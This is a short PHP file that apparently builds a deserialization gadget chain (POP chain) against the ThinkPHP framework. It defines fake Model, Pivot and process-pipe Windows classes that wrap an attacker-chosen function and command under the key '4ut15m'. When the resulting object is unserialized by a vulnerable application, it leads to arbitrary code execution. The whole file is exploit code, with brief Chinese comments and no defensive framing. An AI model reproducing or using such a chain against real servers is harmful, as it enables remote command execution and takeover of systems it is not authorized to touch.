<?php
namespace think {
    abstract class Model{
        private $data = [];
        private $withAttr = [];
        protected $append = ['4ut15m'=>[]];

        public function __construct($func, $cmd){
            $this->relation = false;
            $this->data = ['4ut15m'=>$cmd];		//任意值,value
            $this->withAttr = ['4ut15m'=>$func];
        }
    }
}

namespace think\model {
    use think\Model;
    class Pivot extends Model{
    }
}


namespace think\process\pipes {
    use think\model\Pivot;
    class Windows{
        private $files = [];

        public function __construct($func, $cmd){
            $this->files = [new Pivot($func, $cmd)];		//Conversion类
        }

    }
}

namespace think\view\driver {
    class Php {}
}
